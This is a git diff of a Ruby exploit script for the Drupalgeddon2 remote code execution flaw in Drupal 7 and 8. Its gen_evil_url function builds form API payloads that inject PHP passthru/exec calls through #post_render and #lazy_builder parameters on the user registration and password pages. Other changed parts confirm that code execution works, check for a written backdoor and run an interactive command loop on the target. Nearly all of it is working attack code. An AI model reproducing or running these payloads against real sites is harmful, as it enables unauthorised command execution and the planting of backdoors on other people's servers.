@@ -48,9 +48,10 @@ end
 # Function gen_evil_url <cmd>
 def gen_evil_url(evil, feedback=true)
   # PHP function to use (don't forget about disabled functions...)
-  phpmethod = $drupalverion.start_with?('8')? "exec" : "passthru"
+  phpfunction = $drupalverion.start_with?("8")? "exec" : "passthru"
+  phpfunction = "passthru"
 
-  #puts "[*] PHP cmd: #{phpmethod}" if feedback
+  #puts "[*] PHP cmd: #{phpfunction}" if feedback
   puts "[*] Payload: #{evil}" if feedback
 
   ## Check the version to match the payload
@@ -58,14 +59,14 @@ def gen_evil_url(evil, feedback=true)
   if $drupalverion.start_with?('8')
     # Method #1 - Drupal 8, mail, #post_render - response is 200
     url = $target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
-    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
+    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
 
     # Method #2 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
     #url = $target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
   elsif $drupalverion.start_with?('7')
     # Method #3 - Drupal 7, name, #post_render - response is 200
-    url = $target + "?q=user/password&name[%23post_render][]=" + phpmethod + "&name[%23type]=markup&name[%23markup]=" + evil
+    url = $target + "?q=user/password&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
     payload = "form_id=user_pass&_triggering_element_name=name"
   else
     puts "[!] Unsupported Drupal version"
@@ -85,6 +86,16 @@ def gen_evil_url(evil, feedback=true)
   end
 
   return url, payload
+end
+
+
+# Function clean_result <input>
+def clean_result(input)
+  #result = JSON.pretty_generate(JSON[response.body])
+  #result = $drupalverion.start_with?("8")? JSON.parse(input)[0]["data"] : input
+  result = input
+  result.slice!(/^\[{"command":".*}\]$/)
+  return result
 end
 
 
@@ -203,8 +214,7 @@ random = (0...8).map { (65 + rand(26)).chr }.join
 url, payload = gen_evil_url("echo #{random}")
 response = http_request(url, "post", payload)
 if response.code == "200" and not response.body.empty?
-  #result = JSON.pretty_generate(JSON[response.body])
-  result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+  result = clean_result(response.body)
   puts "[+] Result : #{result}"
 
   puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[+] Target might to be exploitable?"
@@ -241,8 +251,7 @@ paths.each do|path|
   # Check result
   if response.code == "200" and not response.body.empty?
     # Feedback
-    #result = JSON.pretty_generate(JSON[response.body])
-    result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+    result = clean_result(response.body)
     puts "[+] Result : #{result}"
 
     # Test to see if backdoor is there (if we managed to write it)
@@ -299,7 +308,7 @@ loop do
     url, payload = gen_evil_url(command, false)
     response = http_request(url, "post", payload)
     if response.code == "200" and not response.body.empty?
-      result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+      result = clean_result(response.body)
     end
   end
 
